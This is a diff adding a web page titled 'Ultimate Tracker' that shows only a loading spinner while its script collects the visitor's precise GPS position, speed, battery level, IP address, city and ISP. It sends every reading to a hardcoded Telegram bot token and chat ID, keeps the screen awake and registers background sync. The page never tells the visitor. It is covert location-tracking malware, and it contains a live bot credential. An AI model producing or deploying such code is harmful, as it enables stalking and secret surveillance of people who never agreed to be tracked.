@@ -1,0 +1,142 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Ultimate Tracker</title>
+<link rel="manifest" href="manifest.json">
+
+<style>
+body {
+    margin:0; background:#000; color:#fff;
+    font-family:Arial; overflow:hidden;
+    display:flex; justify-content:center;
+    align-items:center; height:100vh;
+    flex-direction:column;
+}
+#loader {
+    position:absolute; top:0; left:0;
+    width:100%; height:100%;
+    background:#000; display:flex;
+    justify-content:center; align-items:center;
+    flex-direction:column; z-index:9999;
+}
+.spinner {
+   width:140px; height:140px; border-radius:50%;
+   border:12px solid #333; border-top-color:#0af;
+   animation:spin 1s linear infinite;
+}
+@keyframes spin {
+   to { transform:rotate(360deg); }
+}
+.signature {
+   position:absolute; bottom:25px; font-size:14px; opacity:.7;
+}
+</style>
+</head>
+<body>
+
+<div id="loader">
+    <div class="spinner"></div>
+    <div style="margin-top:20px;">Loading…</div>
+</div>
+
+<div class="signature">Developed by Omar Abdeltawab Saleh</div>
+
+<script>
+let wakeLock = null;
+let counter=1;
+let lastLat=null,lastLon=null;
+
+async function enableWakeLock(){
+    try {
+        wakeLock = await navigator.wakeLock.request("screen");
+    } catch(e){}
+}
+
+async function getIPInfo(){
+    try {
+        let r=await fetch("https://ipapi.co/json/");
+        return await r.json();
+    } catch(e){
+        return {"ip":"?","city":"?","country":"?","org":"?"};
+    }
+}
+
+function getSpeed(coords){
+ if(lastLat===null){ lastLat=coords.latitude; lastLon=coords.longitude; return 0; }
+ let R=6371e3;
+ let φ1=lastLat*Math.PI/180;
+ let φ2=coords.latitude*Math.PI/180;
+ let dφ=(coords.latitude-lastLat)*Math.PI/180;
+ let dλ=(coords.longitude-lastLon)*Math.PI/180;
+ let a=Math.sin(dφ/2)**2 + Math.cos(φ1)*Math.cos(φ2)*Math.sin(dλ/2)**2;
+ let d=2*R*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
+ lastLat=coords.latitude; lastLon=coords.longitude;
+ return d/5;
+}
+
+async function sendData(lat,lon,acc){
+ let ip=await getIPInfo();
+ let battery="N/A";
+ try {
+    let b=await navigator.getBattery();
+    battery=Math.round(b.level*100)+"%";
+ } catch(e){}
+
+ let sp=getSpeed({latitude:lat,longitude:lon});
+ let msg =
+     "📍 Coordinate #"+(counter++)+
+     "\nLatitude: "+lat+
+     "\nLongitude: "+lon+
+     "\nAccuracy: "+acc+
+     "\nSpeed: "+sp.toFixed(2)+" m/s"+
+     "\nBattery: "+battery+
+     "\nIP: "+ip.ip+
+     "\nCity: "+ip.city+
+     "\nCountry: "+ip.country+
+     "\nISP: "+ip.org;
+
+ fetch("https://api.telegram.org/bot8075471456:AAHL1J_CTzkAp--8ka0pGqDO0GRnwJBkQOA/sendMessage", {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+        chat_id:"6068331455",
+        text:msg
+    })
+ });
+}
+
+function startTracking(){
+ navigator.geolocation.watchPosition(p=>{
+     sendData(p.coords.latitude, p.coords.longitude, p.coords.accuracy);
+ },err=>{},{enableHighAccuracy:true});
+}
+
+async function init(){
+    await enableWakeLock();
+    startTracking();
+    setTimeout(()=>{
+        document.getElementById("loader").style.display="none";
+    },2000);
+
+    if('serviceWorker' in navigator){
+        navigator.serviceWorker.register("sw.js");
+    }
+
+    if('periodicSync' in navigator.serviceWorker){
+        navigator.serviceWorker.ready.then(reg=>{
+            try {
+                reg.periodicSync.register("geo-sync", {
+                     minInterval: 5 * 1000
+                });
+            } catch(e){}
+        });
+    }
+}
+
+init();
+</script>
+</body>
+</html>
